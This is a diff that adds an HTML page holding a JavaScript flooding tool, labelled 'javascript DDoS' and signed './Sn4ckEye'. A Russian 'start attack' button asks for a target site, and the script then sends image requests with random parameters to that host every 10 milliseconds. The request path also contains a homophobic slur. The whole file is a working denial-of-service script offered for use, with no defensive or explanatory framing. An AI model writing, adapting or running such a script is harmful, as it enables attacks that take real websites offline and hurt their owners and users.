@@ -1,0 +1,27 @@
+<!doctype html>
+	<html>
+	<head>
+		</head>
+		<body>
+				<input type="submit" value="Начать атаку" onclick="spam()">
+			</body>
+<script>
+/*
+javascript DDoS by ./Sn4ckEye
+*/
+spam = function() {
+var years = prompt('Сайт для атаки (пример ниже)', 100);
+function imgflood() {
+	
+	console.log(years)
+	var TARGET = years //target
+   var URI = '/index.php?x=HAH_GAYYYYY' //URI, make sure it starts with '/'
+   var pic = new Image()
+   var rand = Math.floor(Math.random() * 1000)
+   pic.src = 'http://'+TARGET+URI+'&'+rand+"=asdf"
+}
+
+setInterval(imgflood, 10)
+}
+</script>
+</html>
